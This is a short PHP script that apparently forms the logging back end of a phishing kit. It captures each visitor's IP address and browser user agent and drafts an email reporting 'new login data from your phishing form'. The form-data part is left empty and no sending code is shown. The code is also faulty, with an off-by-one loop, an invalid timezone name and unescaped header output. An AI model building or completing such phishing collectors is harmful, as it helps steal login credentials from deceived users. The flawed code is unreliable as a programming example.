<?php

error_reporting(E_ALL & ~E_NOTICE);

echo "Displaying lots of device data down here:";

$array = array();
$recvDate = date('l jS \of F Y h:i:s A');
// Get client ip adress
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
array_push($array, $ip);
// All of the data that we want to have, we define here
$browser = $_SERVER['HTTP_USER_AGENT'];
array_push($array, $browser);

for ($x = 0; $x <= count($array); $x++)
{
    echo "$array[$x]\n";
}

// set the default timezone to use. Available since PHP 5.1
date_default_timezone_set('CEST');

// Prints something like: Monday 8th of August 2005 03:12:46 PM
echo date('l jS \of F Y h:i:s A');

echo $emailText = "You have recieved new login data from your phishing form: \n\nClient Data: \n\tSender Browser: $browser\n\tSender IP: $ip\n\tLogin at: $recvDate\n\nForm Data: \n";

?>
